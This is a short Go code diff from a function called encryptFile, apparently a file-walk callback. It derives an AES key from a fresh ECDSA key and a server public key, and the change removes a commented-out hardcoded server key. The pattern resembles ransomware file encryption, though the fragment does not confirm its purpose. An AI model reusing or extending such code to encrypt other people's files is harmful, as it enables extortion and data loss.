@@ -129,7 +129,6 @@ func encryptFile(path string, fi os.FileInfo, err error) (e error) {
 	defer outFile.Close()
 
 	clientPrivKey, _ := GenerateECDSAPrivateKey()
-	//serverPubKey := PubKey{X: "0b787e7fe34c6a1de979ef1850f00dcbade83d897182b9aec7763173729c49b6", Y: "b4c136f8a7d35d07e1fdabe94dd63b0407affb93a1147933baec4abdfefe77d9"}
 	cSymK, _ := GenSharedKey(clientPrivKey, getServerEcdsaPubKey(serverPubKey))
 	aesBlockMode, err := GetCipherBlockMode(cSymK, ENCRYPT_MODE)
 	if err != nil {
